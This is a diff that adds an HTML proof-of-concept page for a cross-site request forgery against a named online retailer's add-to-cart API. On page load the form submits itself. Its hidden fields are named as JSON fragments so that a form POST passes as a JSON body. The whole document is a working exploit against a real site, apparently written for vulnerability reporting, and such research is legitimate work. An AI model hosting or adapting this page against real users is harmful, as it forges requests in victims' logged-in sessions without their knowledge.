@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF PoC — Boozt Add to Cart</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <h1>CSRF PoC — Boozt Add to Cart</h1>
+    <form action="https://www.boozt.com/eu/en/api/shopcart/item" method="POST">
+      <input type="hidden" name='{"shopcart_item_addeanId"' value='229348277' />
+      <input type="hidden" name='"shopcart_item_addquantity"}' value='1' />
+    </form>
+  </body>
+</html>
